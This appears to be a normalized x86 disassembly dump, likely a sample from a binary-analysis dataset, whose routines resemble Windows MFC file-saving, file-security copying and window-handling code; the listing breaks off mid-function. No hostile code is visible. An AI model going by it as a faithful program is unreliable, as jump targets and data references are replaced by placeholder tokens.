cmp [ eax - 0x8 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x14 ]
push eax
call sub_442560
sub_445966
xor ebx ebx
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] bl
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
jmp r-xdata
xor esi esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
sub_4459c4
mov eax sub_463a60
call sub_42dc88
push ecx
push ecx
push edi
mov edi ecx
mov eax [ edi ]
call [ eax + 0x58 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push ebx
push esi
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x20 ]
lea esi [ edi + 0x20 ]
xor ebx ebx
cmp [ eax - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push esi
lea ecx [ ebp - 0x10 ]
call sub_442281
cmp [ rw-data ] ebx
je r-xdata
lea eax [ edi + 0x1c ]
lea ecx [ ebp - 0x10 ]
push eax
call sub_442281
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x10 ]
mov esi 0xf103
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
push esi
push eax
call sub_44af4d
push esi
push 0x3
push [ ebp - 0x14 ]
call sub_4496b7
dec eax
dec eax
je r-xdata
mov esi [ esi ]
mov eax 0x104
push eax
push eax
lea ecx [ ebp - 0x10 ]
call sub_442578
push eax
push esi
call sub_444a11
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
push 0xf003
lea ecx [ ebp - 0x10 ]
call sub_4437c6
jmp r-xdata
xor esi esi
sub eax 0x4
jne r-xdata
push 0x1
pop esi
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x9c ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov eax esi
pop esi
pop ebx
sub_445ac6
mov eax sub_463a74
call sub_42dc88
sub esp 0x108
mov eax [ rw-data ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ ebp - 0x10 ] ebx
mov [ ebp + 0x14 ] eax
mov esi [ ebp + 0xc ]
xor edi edi
cmp esi edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax - 0x8 ] edi
jne r-xdata
push r--data
mov ecx esi
call sub_442eba
test eax eax
jne r-xdata
push [ ebp - 0x10 ]
push 0x30
push [ ebp + 0x14 ]
call sub_4496b7
cmp [ rw-data ] edi
push 0x104
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x14 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
push r--data
mov ecx esi
call sub_442eba
test eax eax
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x114 ]
push eax
call [ lstrcpynA@IAT ]
lea eax [ ebp - 0x114 ]
push eax
push [ ebp + 0x8 ]
call sub_444a11
jmp r-xdata
push r--data
mov ecx esi
call sub_442eba
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
cmp esi 0x3
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp + 0x14 ]
push ebx
push eax
call sub_44af4d
mov eax [ esi + 0x10 ]
lea ecx [ esi + 0x10 ]
cmp [ eax - 0x8 ] edi
jne r-xdata
mov ebx 0xf120
jmp r-xdata
cmp esi 0x4
jle r-xdata
push 0xff
lea ecx [ ebp + 0x14 ]
call sub_442578
mov edx [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push 0x100
push eax
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_4422d1
cmp esi 0x7
jg r-xdata
push 0xffffffff
lea ecx [ ebp + 0x14 ]
call sub_4425c7
mov esi [ esi + 0x8 ]
cmp esi 0x2
jl r-xdata
cmp esi 0x3
jle r-xdata
mov ebx 0xf121
cmp esi 0x5
je r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] edi
setne bl
add ebx 0xf123
jmp r-xdata
cmp esi 0xd
jne r-xdata
mov ebx 0xf122
jmp r-xdata
sub_445c32
mov eax sub_463a9f
call sub_42dc88
sub esp 0x10c
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
push 0x1
lea eax [ ebp + 0xc ]
pop esi
push eax
lea eax [ ebp - 0x118 ]
push eax
push 0x104
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
call [ GetFullPathNameA@IAT ]
mov eax [ ebp + 0xc ]
push 0x105
lea ecx [ ebp - 0x10 ]
mov [ eax ] bl
call sub_442578
push eax
push ebx
lea eax [ ebp - 0x118 ]
push r--data
push eax
call [ GetTempFileNameA@IAT ]
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
mov [ ebp - 0x14 ] esi
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] bl
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push [ ebp - 0x10 ]
call sub_44447e
sub_445cd8
mov eax sub_463abc
call sub_42dc88
sub esp 0x144
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x10 ]
mov ecx esi
call sub_4420d3
test [ ebp + 0xd ] 0x10
je r-xdata
mov eax [ esi ]
xor ebx ebx
cmp [ eax - 0x8 ] ebx
je r-xdata
lea eax [ ebp - 0x150 ]
push eax
push [ ebp + 0x8 ]
call sub_445078
test eax eax
je r-xdata
mov ecx esi
call sub_4420d3
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444130
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
push eax
call sub_444130
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call sub_444888
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x10 ]
call [ GetDiskFreeSpaceA@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
lea ecx [ edi + 0xc ]
call sub_4422d1
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push [ edi + 0x4 ]
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x144 ]
add eax eax
cmp ebx eax
jbe r-xdata
mov ebx [ ebp - 0x24 ]
imul ebx [ ebp - 0x20 ]
imul ebx [ ebp - 0x1c ]
lea eax [ ebp + 0xc ]
mov edi [ GetFileSecurityA@IAT ]
push eax
push ebx
push ebx
push 0x4
push [ ebp + 0x8 ]
mov [ ebp + 0xc ] ebx
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x150 ]
push eax
call sub_44512a
pop ecx
lea eax [ ebp - 0x38 ]
pop ecx
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push [ edi + 0x4 ]
call [ SetFileTime@IAT ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
push 0x1
lea eax [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push eax
call sub_445c32
add esp 0xc
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_442281
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_442148
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0xc ]
call sub_441e89
mov ebx eax
pop ecx
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push ebx
push 0x4
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push ebx
call sub_441eb2
pop ecx
push ebx
push 0x4
push [ esi ]
call [ SetFileSecurityA@IAT ]
sub_445e98
mov eax sub_463ae0
call sub_42dc88
sub esp 0x20
push ebx
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
lea eax [ esi + 0xc ]
push eax
call sub_441ebd
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_44434b
mov eax [ esi + 0x10 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_442148
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x38 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
xor edi edi
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] ebx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
push [ ebp - 0x18 ]
call sub_44447e
push r--data
call [ GetModuleHandleA@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
mov [ ebp - 0x2c ] eax
je r-xdata
push [ ebp - 0x18 ]
mov esi [ esi + 0x10 ]
push esi
call sub_44445c
jmp r-xdata
push [ ebp - 0x14 ]
call sub_44447e
mov eax [ esi + 0x10 ]
push ebx
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_445c32
add esp 0xc
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x2
call sub_442281
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
mov eax [ ebp - 0x14 ]
mov edi [ lstrlenA@IAT ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
jne r-xdata
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_442148
push eax
call edi
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push esi
push eax
push 0xffffffff
push [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
mov [ eax ] bx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x24 ]
mov esi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x20 ] ebx
jmp r-xdata
push eax
call edi
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push esi
push eax
push 0xffffffff
push [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
mov [ eax ] bx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x24 ]
mov esi [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
jne r-xdata
push eax
call edi
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov edi esp
push esi
push edi
push 0xffffffff
push [ ebp - 0x10 ]
mov [ edi ] bx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov esi [ ebp - 0x1c ]
xor edi edi
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
jne r-xdata
push [ ebp - 0x14 ]
call sub_44447e
call [ GetLastError@IAT ]
mov edi eax
cmp edi 0x498
je r-xdata
push ebx
push ebx
push 0x3
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push edi
call [ ebp - 0x2c ]
cmp eax ebx
jne r-xdata
cmp edi ebx
jne r-xdata
cmp edi 0x499
jne r-xdata
sub_446076
mov eax sub_463af5
call sub_42dc88
push ecx
push esi
push 0x14
call sub_441e89
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_44401e
mov eax [ rw-data ]
mov [ esi + 0x10 ] eax
mov [ esi ] r--data
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
test esi esi
je r-xdata
push [ ebp + 0x10 ]
mov eax [ esi ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x20 ]
test eax eax
jne r-xdata
xor esi esi
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_446104
mov eax sub_463b08
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_444073
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_446139
cmp [ esp + 0x8 ] 0x0
push esi
mov esi [ esp + 0x8 ]
mov ecx esi
mov eax [ esi ]
je r-xdata
call [ eax + 0x4c ]
call [ eax + 0x44 ]
jmp r-xdata
pop esi
retn 0x8
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
test esi esi
je r-xdata
sub_446162
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x58 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x6c ]
lea ecx [ esi + 0x20 ]
call sub_4420d3
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x5c ]
push 0x1
pop eax
pop esi
retn
sub_446187
mov eax sub_463b54
call sub_42dc88
sub esp 0x68
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] esi
mov eax [ esi ]
call [ eax + 0x58 ]
lea ecx [ ebp - 0x30 ]
call sub_442f71
mov eax [ rw-data ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x24 ] 0xffffffff
mov edi r--data
push ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x28 ] ebx
call sub_4422d1
mov eax [ esi ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x20
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ eax + 0x84 ]
mov [ ebp - 0x14 ] eax
cmp eax ebx
mov eax [ esi ]
jne r-xdata
mov ecx esi
call [ eax + 0x6c ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x5c ]
push ebx
push 0x1000
push 0x3
lea ecx [ ebp - 0x74 ]
push [ ebp - 0x14 ]
call sub_447b03
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x4 ] 0x5
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bc5
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ecx ]
call [ eax + 0x30 ]
cmp eax ebx
je r-xdata
push 0xf101
lea ecx [ ebp - 0x30 ]
push ebx
push ecx
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x80 ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea ecx [ ebp - 0x74 ]
call sub_447c67
mov eax [ esi ]
push ebx
push [ ebp - 0x14 ]
mov ecx esi
call [ eax + 0x88 ]
mov [ ebp - 0x4 ] 0x5
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
mov eax [ esi ]
push ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call [ eax + 0x5c ]
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
call sub_447bdf
mov [ ebp - 0x30 ] edi
push 0x1
mov [ ebp - 0x4 ] 0xb
pop ebx
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x74 ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
lea ecx [ ebp - 0x20 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
mov eax ebx
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_4462c0
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x10 ] esp
push 0x1
mov ecx esi
mov eax [ esi ]
push [ ebp - 0x14 ]
call [ eax + 0x88 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x6c ]
mov eax [ esi ]
push 0xf101
push 0x0
mov ecx esi
push [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x8
push [ ebp + 0x8 ]
call [ eax + 0x80 ]
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x7
call sub_442f87
mov eax sub_44631a
retn
sub_44631a
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
call sub_447bdf
mov [ ebp - 0x30 ] r--data
mov [ ebp - 0x4 ] 0xa
xor ebx ebx
lea ecx [ ebp - 0x20 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
mov eax ebx
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_446351
mov eax sub_463ba0
call sub_42dc88
sub esp 0x68
push ebx
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] esi
call sub_442f71
mov eax [ rw-data ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x24 ] 0xffffffff
mov edi r--data
push ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x28 ] ebx
call sub_4422d1
mov eax [ esi ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0x1012
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ eax + 0x84 ]
cmp eax ebx
mov [ ebp - 0x14 ] eax
jne r-xdata
push ebx
push 0x1000
push 0x2
push eax
lea ecx [ ebp - 0x74 ]
call sub_447b03
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x4 ] 0x5
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bc5
mov eax [ esi ]
lea ecx [ ebp - 0x74 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_447c67
mov eax [ esi ]
push ebx
push [ ebp - 0x14 ]
mov ecx esi
call [ eax + 0x88 ]
mov [ ebp - 0x4 ] 0x5
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
mov eax [ esi ]
push ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call [ eax + 0x5c ]
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
call sub_447bdf
mov [ ebp - 0x30 ] edi
push 0x1
mov [ ebp - 0x4 ] 0xb
pop ebx
jmp r-xdata
mov eax [ esi ]
push 0xf100
lea ecx [ ebp - 0x30 ]
push 0x1
push ecx
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x80 ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea ecx [ ebp - 0x20 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
mov eax ebx
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_44646d
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x10 ] esp
push 0x1
mov ecx esi
mov eax [ esi ]
push [ ebp - 0x14 ]
call [ eax + 0x88 ]
mov eax [ esi ]
push 0xf102
push 0x1
mov ecx esi
push [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x8
push [ ebp + 0x8 ]
call [ eax + 0x80 ]
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x7
call sub_442f87
mov eax sub_4464c0
retn
sub_4464c0
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
call sub_447bdf
mov [ ebp - 0x30 ] r--data
mov [ ebp - 0x4 ] 0xa
xor ebx ebx
lea ecx [ ebp - 0x20 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
mov eax ebx
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_4464f7
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x48 ]
and [ esi + 0x48 ] 0x0
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi ]
mov ecx esi
mov [ esi + 0x48 ] ebx
call [ eax + 0x6c ]
cmp [ esi + 0x48 ] 0x0
je r-xdata
push edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x8 ]
call sub_43fcfb
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x94 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x58 ]
cmp [ esi + 0x34 ] 0x0
jne r-xdata
pop edi
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_44654f
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
lea ecx [ esi + 0x28 ]
call sub_43cef0
mov [ edi + 0x3c ] esi
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
pop edi
pop esi
retn 0x4
sub_44656f
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
push 0x0
lea edi [ esi + 0x28 ]
push ebx
mov ecx edi
call sub_43cf74
push eax
mov ecx edi
call sub_43cf3d
and [ ebx + 0x3c ] 0x0
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
pop edi
pop esi
pop ebx
retn 0x4
sub_4465b6
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441aa8
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x10
xor eax eax
push [ ebp + 0x14 ]
mov eax [ ecx ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xc ]
test eax eax
je r-xdata
sub_446609
mov eax sub_463de8
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
call sub_453349
cmp [ eax + 0xc0 ] esi
jne r-xdata
mov ecx [ esi + 0x3c ]
test ecx ecx
je r-xdata
call sub_453349
and [ eax + 0xc0 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_44656f
sub_44665c
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x8
call sub_44121e
mov [ esi + 0x28 ] r--data
push 0x1
pop eax
pop esi
retn 0x4
mov eax [ esi + 0x20 ]
test eax 0x800000
je r-xdata
or [ esi + 0x2d ] 0x2
and eax 0xff7fffff
mov [ esi + 0x20 ] eax
sub_44669b
push esi
mov esi ecx
call sub_43e71a
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax eax
jmp r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop esi
retn 0x4
push esi
mov ecx eax
call sub_44654f
sub_4466cb
push esi
push edi
mov edi ecx
call sub_43fcfb
mov esi eax
test esi esi
je r-xdata
mov ecx edi
call sub_43eebd
pop edi
pop esi
retn
mov ecx esi
call sub_4504c3
cmp eax edi
jne r-xdata
push 0x1
push 0x0
mov ecx esi
call sub_4504ca
sub_446706
push esi
xor esi esi
cmp [ esp + 0xc ] esi
push edi
mov edi ecx
je r-xdata
push esi
mov ecx edi
push [ esp + 0x10 ]
call sub_440422
call sub_441659
push eax
push esi
push esi
mov esi [ esp + 0x18 ]
push esi
call [ AdjustWindowRectEx@IAT ]
mov ecx edi
call sub_44163f
test eax 0x200000
mov ecx 0x800000
je r-xdata
test eax 0x100000
je r-xdata
mov edx [ rw-data ]
test ecx eax
je r-xdata
pop edi
pop esi
retn 0x8
mov edx [ rw-data ]
test ecx eax
je r-xdata
add [ esi + 0x8 ] edx
dec edx
add [ esi + 0xc ] edx
jmp r-xdata
dec edx
sub_44676e
mov eax sub_463dfc
call sub_42dc88
push ecx
push ecx
push edi
mov edi ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_441aa8
test eax eax
je r-xdata
cmp [ edi + 0x3c ] 0x0
je r-xdata
push 0x1
pop eax
jmp r-xdata
xor eax eax
push ebx
push esi
call sub_453349
mov esi eax
mov [ ebp - 0x10 ] esi
mov ebx [ esi + 0xc0 ]
mov [ esi + 0xc0 ] edi
mov [ ebp - 0x14 ] ebx
push [ ebp + 0x14 ]
mov ecx [ edi + 0x3c ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x10 ]
mov eax [ ecx ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xc ]
mov [ esi + 0xc0 ] ebx
pop esi
pop ebx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
sub_4467eb
mov eax sub_463e10
call sub_42dc88
sub esp 0x54
push esi
mov esi ecx
push esi
lea ecx [ ebp - 0x60 ]
call sub_447621
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
push 0x0
push ecx
mov ecx esi
call [ eax + 0xdc ]
mov eax [ esi ]
lea ecx [ ebp - 0x60 ]
push ecx
mov ecx esi
call [ eax + 0xf0 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x60 ]
call sub_447693
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_446892
push ebp
push esi
mov esi ecx
call sub_43e71a
mov ebp eax
cmp ebp 0x3
je r-xdata
mov eax ebp
cmp ebp 0x4
je r-xdata
push ebx
mov ecx esi
call sub_43fcfb
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebp
pop ebx
jmp r-xdata
push edi
mov ecx ebx
call sub_4504c3
mov edi eax
call [ GetFocus@IAT ]
cmp edi esi
pop edi
jne r-xdata
pop esi
pop ebp
retn 0xc
push 0x1
push esi
mov ecx ebx
call sub_4504ca
mov ecx [ esi + 0x1c ]
cmp ecx eax
je r-xdata
push eax
push ecx
call [ IsChild@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
push esi
push esi
push 0x1
mov ecx esi
call [ eax + 0xe4 ]
jmp r-xdata
sub_44691b
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
push [ eax + 0x1c ]
mov edi [ GetParent@IAT ]
lea esi [ eax + 0x1c ]
call edi
push eax
call sub_43e7b3
mov ebx eax
push r--data
mov ecx ebx
call sub_442eba
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x8
mov eax ebx
push [ esi ]
call edi
push eax
call sub_43e7b3
test eax eax
je r-xdata
push [ eax + 0x1c ]
lea esi [ eax + 0x1c ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
sub_446979
push esi
push edi
mov esi ecx
call sub_44163f
mov edx [ esp + 0xc ]
mov ecx 0x100000
neg edx
sbb edx edx
and edx ecx
add edx ecx
test edx eax
jne r-xdata
xor eax eax
push 0x1
push esi
call sub_44691b
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
cmp eax 0xe900
jb r-xdata
cmp eax 0xe9ff
ja r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
add eax 0xffff1700
shr eax 0x4
add eax 0xea10
and eax 0xf
add eax 0xea00
jmp r-xdata
pop edi
pop esi
retn 0x4
push eax
mov ecx edi
call sub_441585
jmp r-xdata
sub_4469ee
push 0x0
push ecx
call sub_44691b
test eax eax
je r-xdata
xor eax eax
cmp [ eax + 0x80 ] 0x0
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ esp + 0x4 ]
push eax
mov edx [ ecx ]
call [ edx ]
retn 0x4
sub_446a32
push esi
push 0x0
push ecx
call sub_44691b
mov esi [ esp + 0x8 ]
test eax eax
je r-xdata
